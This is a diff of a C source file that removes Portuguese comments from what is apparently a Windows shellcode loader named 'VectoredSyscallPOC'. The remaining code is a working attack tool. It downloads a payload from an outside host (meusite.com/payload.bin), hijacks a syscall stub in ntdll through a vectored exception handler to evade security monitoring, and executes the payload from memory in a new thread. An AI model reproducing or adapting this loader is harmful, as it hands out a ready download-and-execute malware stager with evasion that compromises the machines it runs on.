@@ -4,14 +4,14 @@
 
 #pragma comment(lib, "winhttp.lib")
 
-SIZE_T G_SYSCALL_ADDR = 0;  // Endereço global da syscall
+SIZE_T G_SYSCALL_ADDR = 0; 
 
-// Função para encontrar o endereço da syscall a partir de uma base
+
 BYTE* FindSyscallAddr(BYTE* base) {
     BYTE* func_base = base;
     BYTE* temp_base = NULL;
 
-    // 0F 05 syscall
+    
     while (*func_base != 0xC3) {
         temp_base = func_base;
         if (*temp_base == 0x0F) {
@@ -29,7 +29,7 @@ BYTE* FindSyscallAddr(BYTE* base) {
     return NULL;
 }
 
-// Manipulador de exceção para modificar o contexto e redirecionar para a syscall
+
 LONG WINAPI HandleException(EXCEPTION_POINTERS* ExceptionInfo) {
     if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
         CONTEXT* context = ExceptionInfo->ContextRecord;
@@ -41,7 +41,7 @@ LONG WINAPI HandleException(EXCEPTION_POINTERS* ExceptionInfo) {
     return EXCEPTION_EXECUTE_HANDLER;
 }
 
-// Função para baixar o payload de uma URL
+
 BYTE* DownloadPayload(LPCWSTR host, LPCWSTR path, INTERNET_PORT port, BOOL is_https, DWORD* payload_size) {
     DWORD flags = is_https ? WINHTTP_FLAG_SECURE : 0;
 
@@ -108,21 +108,21 @@ BYTE* DownloadPayload(LPCWSTR host, LPCWSTR path, INTERNET_PORT port, BOOL is_ht
 }
 
 void VectoredSyscallPOC(BYTE* payload, size_t payload_size) {
-    // Obtenção da handle do ntdll.dll
+    
     HMODULE ntdll = GetModuleHandleA("ntdll.dll");
     if (ntdll == NULL) {
         printf("[-] Error GetModuleHandleA\n");
         return;
     }
 
-    // Resolução da função ZwDrawText
+    
     FARPROC drawtext = GetProcAddress(ntdll, "ZwDrawText");
     if (drawtext == NULL) {
         printf("[-] Error GetProcAddress\n");
         return;
     }
 
-    // Encontrar o endereço da syscall
+    
     BYTE* syscall_addr = FindSyscallAddr((BYTE*)drawtext);
     if (syscall_addr == NULL) {
         printf("[-] Error Resolving syscall Address\n");
@@ -131,20 +131,20 @@ void VectoredSyscallPOC(BYTE* payload, size_t payload_size) {
 
     G_SYSCALL_ADDR = (SIZE_T)syscall_addr;
 
-    // Adicionar o manipulador de exceção
+    
     AddVectoredExceptionHandler(1, HandleException);
 
-    // Alocação de memória no próprio processo
+    
     LPVOID local_base = VirtualAlloc(NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (local_base == NULL) {
         printf("[-] Allocation Failed\n");
         return;
     }
 
-    // Escrever o payload na memória local
+    
     memcpy(local_base, payload, payload_size);
 
-    // Alterar proteção de memória para execução
+    
     DWORD old_protection;
     if (!VirtualProtect(local_base, payload_size, PAGE_EXECUTE_READ, &old_protection)) {
         printf("[-] Failed to change memory protection from RW to RX\n");
@@ -152,7 +152,7 @@ void VectoredSyscallPOC(BYTE* payload, size_t payload_size) {
         return;
     }
 
-    // Criar uma thread para executar o payload no próprio processo
+    
     HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)local_base, NULL, 0, NULL);
     if (hThread == NULL) {
         printf("[-] Failed to Execute Thread\n");
@@ -165,7 +165,7 @@ void VectoredSyscallPOC(BYTE* payload, size_t payload_size) {
 }
 
 int main() {
-    // Exemplo de URL: https://meusite.com:443/payload.bin
+    
     DWORD payload_size = 0;
     BYTE* payload = DownloadPayload(L"meusite.com", L"/payload.bin", 443, TRUE, &payload_size);
 
@@ -174,7 +174,7 @@ int main() {
         return -1;
     }
 
-    // Função que processa o payload baixado
+    
     VectoredSyscallPOC(payload, payload_size);
 
     free(payload);
